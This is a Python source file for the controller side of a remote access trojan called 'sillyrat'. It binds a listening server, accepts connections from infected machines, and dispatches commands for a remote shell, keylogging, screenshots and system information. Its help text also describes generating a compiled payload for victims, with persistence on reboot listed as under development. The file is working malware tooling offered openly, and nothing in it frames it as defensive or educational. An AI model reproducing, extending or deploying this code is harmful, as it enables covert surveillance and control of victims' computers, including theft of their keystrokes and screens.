import sys
import os
import socket
import time
import base64
import tabulate
import signal
import subprocess
import argparse
import shutil
import threading
import platform
import PyInstaller.__main__
from datetime import datetime


__HELP_OVERALL__ = """usage: python3 sillyray.py command [--help] [--option OPTION]

These are the commands available for usage:

    bind        Run the Server on machine and establish connections
    generate    Generate the Payload file for target platform

You can further get help on available commands by supplying
'--help' argument. For example: 'python3 sillyrat generate --help'
will print help manual for generate commmand
"""

__HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind

The Bind command is used to bind the application on server
for incoming connections and control the clients through
the command interface
"""

__HELP_GENERATE__ = """
usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]

    Args              Description
    -h, --help        Show Help Manual for generate command
    -a, --address     IP Address of server. [Connect to]
    -p, --port        Port of connecting server
    -o, --output      Output file to generate
    -s, --source      Do not generate compiled code.
                      Gives Python source file.
        --persistence Auto start on reboot [Under Development]

The generate command generates the required payload
file to be executed on client side. The establish
connection to server and do commands.
"""

from common.output import pull
from main.client import CLIENT
from main.communication import COMMCENTER


class SERVER(COMMCENTER):

    SOCKET  = None
    RUNNER  = True

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            pull.print("Successfuly Bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            pull.exit("Unable to bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )


    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    #### Commands ####

    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                self.c_exit()
            elif vals[0] == "help":
                self.c_help(vals)
            elif vals[0] == "sessions":
                self.c_sessions()
            elif vals[0] == "ping":
                self.c_ping(vals)
            elif vals[0] == "connect":
                self.c_connect(vals)
            elif vals[0] == "disconnect":
                self.c_disconnect()
            elif vals[0] == "shell":
                self.c_shell()
            elif vals[0] == "clear":
                self.c_clear()
            elif vals[0] == "keylogger":
                self.c_keylogger(vals)
            elif vals[0] == "sysinfo":
                self.c_sysinfo()
            elif vals[0] == "screenshot":
                self.c_screenshot()

    def launch(self):
        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")

        while True:
            val = pull.get_com(self.CURRENT)
            self.execute(val.split(" "))

    def close(self):
        self.SOCKET.close()


